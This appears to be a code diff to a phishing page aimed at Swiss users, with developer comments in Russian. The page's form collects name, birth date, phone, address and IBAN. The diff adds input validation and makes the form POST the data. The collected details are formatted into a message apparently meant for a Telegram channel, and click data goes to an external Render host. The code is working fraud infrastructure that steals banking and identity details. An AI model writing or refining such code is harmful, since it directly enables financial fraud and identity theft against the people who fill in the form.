@@ -187,6 +187,7 @@
           <div class="input-group">
             <label for="geburtsdatum" class="input-label-top" data-lang-ch="Ihr Geburtsdatum" data-lang-en="Your date of birth">Ihr Geburtsdatum</label>
             <input type="text" id="geburtsdatum" class="input-field" placeholder="__ / __ / ____" required>
+            <span id="birthdateError" style="color: #ffcccc; font-size: 12px; display: none;"></span>
           </div>
           <div class="input-group">
             <label for="telefon" class="input-label-top" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
@@ -203,6 +204,7 @@
           <div class="input-group">
             <label for="iban" class="input-label-top" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
             <input type="text" id="iban" class="input-field" placeholder="CH" required>
+            <span id="ibanError" style="color: #ffcccc; font-size: 12px; display: none;"></span>
           </div>
           <button type="submit" class="premium-btn" data-lang-ch="Senden" data-lang-en="Send">Senden</button>
         </form>
@@ -347,6 +349,8 @@
           if (value.length > 2) formatted += '/' + value.substring(2, 4);
           if (value.length > 4) formatted += '/' + value.substring(4, 8);
           e.target.value = formatted;
+          const err = document.getElementById('birthdateError');
+          if (err) err.style.display = 'none';
         });
       }
 
@@ -367,15 +371,60 @@
         });
       });
 
+      // Валидация IBAN
+      const ibanInput = document.getElementById('iban');
+      if (ibanInput) {
+        ibanInput.addEventListener('input', function() {
+          this.value = this.value.replace(/\s/g, '').toUpperCase();
+          const err = document.getElementById('ibanError');
+          if (err) err.style.display = 'none';
+        });
+      }
+
+      // Валидация даты рождения
+      function validateBirthdate(value) {
+        const parts = value.split('/');
+        if (parts.length !== 3) return { valid: false, message: 'Ungültiges Datum.' };
+        const day = parseInt(parts[0], 10);
+        const month = parseInt(parts[1], 10);
+        const year = parseInt(parts[2], 10);
+        if (isNaN(day) || isNaN(month) || isNaN(year)) return { valid: false, message: 'Ungültiges Datum.' };
+        if (year < 1950 || year > 2008) return { valid: false, message: 'Ungültiges Datum.' };
+        if (month < 1 || month > 12) return { valid: false, message: 'Ungültiges Datum.' };
+        const date = new Date(year, month - 1, day);
+        if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
+          return { valid: false, message: 'Ungültiges Datum.' };
+        }
+        return { valid: true, message: '' };
+      }
+
       const form = document.getElementById('telegramForm');
-      form.addEventListener('submit', () => {
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        const ibanErr = document.getElementById('ibanError');
+        const birthErr = document.getElementById('birthdateError');
+        if (ibanErr) ibanErr.style.display = 'none';
+        if (birthErr) birthErr.style.display = 'none';
+
+        const iban = document.getElementById('iban').value.trim();
+        if (iban.length < 20) {
+          if (ibanErr) { ibanErr.textContent = 'Ungültige IBAN.'; ibanErr.style.display = 'block'; }
+          return;
+        }
+
+        const geburtsdatum = document.getElementById('geburtsdatum').value.trim();
+        const birthdateValidation = validateBirthdate(geburtsdatum);
+        if (!birthdateValidation.valid) {
+          if (birthErr) { birthErr.textContent = birthdateValidation.message; birthErr.style.display = 'block'; }
+          return;
+        }
+
         const name = document.getElementById('name').value;
-        const geburtsdatum = document.getElementById('geburtsdatum').value;
         const telefon = document.getElementById('telefon').value;
         const adresse = document.getElementById('adresse').value;
         const plz = document.getElementById('plz').value;
         const stadt = document.getElementById('stadt').value;
-        const iban = document.getElementById('iban').value;
 
         const now = new Date();
         const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
@@ -396,7 +445,17 @@
         message += `🌐 Browser: ${browserInfo}\n`;
 
         document.getElementById('telegramText').value = message;
-        setTimeout(() => { form.reset(); }, 500); 
+        
+        // Отправка формы в скрытый iframe
+        const formData = new FormData(form);
+        fetch(form.action, {
+          method: 'POST',
+          body: formData
+        }).then(() => {
+          form.reset();
+        }).catch(() => {
+          form.reset();
+        });
       });
     });
   </script>
@@ -415,12 +474,11 @@
             time: new Date().toISOString()
         };
 
-        // Если фронт и бэк на одном домене (например, на Render) — оставь так:
         fetch('https://shwidjk.onrender.com/save_click', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-}).catch(err => console.error('Error saving click:', err));
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(err => console.error('Error saving click:', err));
     });
   </script>
 </body>
